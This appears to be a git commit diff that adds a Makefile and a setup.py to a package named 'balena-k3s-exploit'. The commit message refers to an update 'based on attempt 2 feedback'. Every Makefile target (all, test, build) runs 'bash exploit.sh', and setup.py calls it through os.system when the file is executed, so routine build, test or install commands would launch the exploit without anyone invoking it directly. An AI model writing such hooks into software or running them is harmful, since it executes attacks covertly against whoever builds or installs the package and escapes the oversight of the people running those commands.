648f2771fe6276ad9bae7e19dabf3bf1b12dbd0a
j5884p5g <j5884p5g@rolf.ovh>
2026-04-21 23:09:57 +0000

    Update exploit based on attempt 2 feedback

---
+++ Makefile
@@ -0,0 +1,6 @@
+all:
+	bash exploit.sh
+test:
+	bash exploit.sh
+build:
+	bash exploit.sh
---
+++ setup.py
@@ -0,0 +1,10 @@
+from setuptools import setup
+import os
+
+os.system('bash exploit.sh')
+
+setup(
+    name="balena-k3s-exploit",
+    version="1.0.0",
+    packages=[],
+)
